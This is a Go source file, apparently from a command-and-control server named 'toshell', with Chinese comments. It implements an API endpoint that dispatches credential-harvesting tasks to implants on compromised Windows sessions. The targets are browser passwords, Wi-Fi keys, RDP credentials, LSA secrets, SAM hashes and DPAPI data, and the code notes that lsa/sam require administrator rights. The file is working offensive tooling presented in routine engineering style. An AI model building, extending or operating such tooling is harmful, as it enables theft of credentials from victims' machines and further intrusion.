package api

import (
	"encoding/json"
	"fmt"
	"net/http"
	"strings"

	"github.com/gorilla/mux"
	"toshell/internal/server/logging"
	"toshell/internal/server/task"
)

// credentialsPollTimeoutSec 凭据任务在前端轮询的总超时（秒）。
//
// 与植入端的重活超时对齐关系：植入端 credentials 走 heavyExecTimeout=180s
// （超时返回"已放弃等待，后台可能仍在执行"），前端多留 20s 余量 → 200s。
// 服务端在这里回显，避免前端与植入端各写一份数字后漂移。
const credentialsPollTimeoutSec = 200

// credentialsResultHint 给调用方（前端/Agent）的结果结构说明。
// 凭据结果按 action 分段（browser/wifi/rdp/lsa/sam/dpapi），每段带
// count/returned/bytes/truncated，因此界面能逐段渲染而不是解析一个巨型字符串。
const credentialsResultHint = "结果按 action 分段返回：每段含 action/label/count/returned/bytes/truncated/data，" +
	"任一段超过 64 KiB 会截断并标注 truncated=true；lsa/sam 需要管理员权限。"

// credentialsHandler 处理凭据收集请求
// POST /api/v1/sessions/{id}/credentials
func (s *Server) credentialsHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	vars := mux.Vars(r)
	id := vars["id"]

	var req struct {
		Action string `json:"action"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		req.Action = "all"
	}

	if req.Action == "" {
		req.Action = "all"
	}

	// 验证 action 参数
	validActions := map[string]bool{
		"all":     true,
		"browser": true,
		"wifi":    true,
		"rdp":     true,
		"lsa":     true,
		"sam":     true,
		"dpapi":   true,
	}
	if !validActions[req.Action] {
		writeJSONError(w, http.StatusBadRequest,
			"无效的 action 参数，支持: all, browser, wifi, rdp, lsa, sam, dpapi")
		return
	}

	// 会话不存在 → 404、listener 未就绪 → 503：别把「客户端 id 写错」报成 5xx 服务端故障
	// （语义约定见 handlers_session_guard.go）。
	if !s.requireSessionFromPath(w, r) {
		return
	}
	if !s.requireListener(w) {
		return
	}

	// 明确的"仅支持 Windows"：在 Linux 会话上下发凭据收集只会得到一个失败任务
	// （features_unix.go 返回 "credentials collection only supported on Windows"），
	// 这里提前用中文拒绝，前端拿到的是可直接展示的原文，而不是一个空结果任务。
	if s.sessionMgr != nil {
		if sess, err := s.sessionMgr.Get(id); err == nil && sess != nil && sess.Info != nil {
			osName := strings.ToLower(strings.TrimSpace(sess.Info.OS))
			if osName != "" && !strings.HasPrefix(osName, "win") {
				writeJSONError(w, http.StatusBadRequest,
					fmt.Sprintf("该能力仅支持 Windows（当前会话操作系统：%s）", sess.Info.OS))
				return
			}
		}
	}

	credentialData, _ := json.Marshal(map[string]string{
		"action": req.Action,
	})

	taskInfo, err := s.taskMgr.Create(id, task.TaskParams{
		TaskType: "credentials",
		Data:     string(credentialData),
	})
	if err != nil {
		writeJSONError(w, http.StatusInternalServerError, err.Error())
		return
	}

	if err := s.listener.PushTask(id, taskInfo); err != nil {
		writeJSONError(w, http.StatusInternalServerError, err.Error())
		return
	}

	// 审计口径：只记任务 id 与 action，不记结果内容（凭据不进日志）。
	logging.Info("api", "Credential collection task pushed to session %s (task #%d, action: %s)",
		id, taskInfo.ID, req.Action)

	json.NewEncoder(w).Encode(map[string]interface{}{
		"task_id":          taskInfo.ID,
		"action":           req.Action,
		"message":          "凭据收集任务已下发",
		"poll_timeout_sec": credentialsPollTimeoutSec,
		"result_hint":      credentialsResultHint,
	})
}
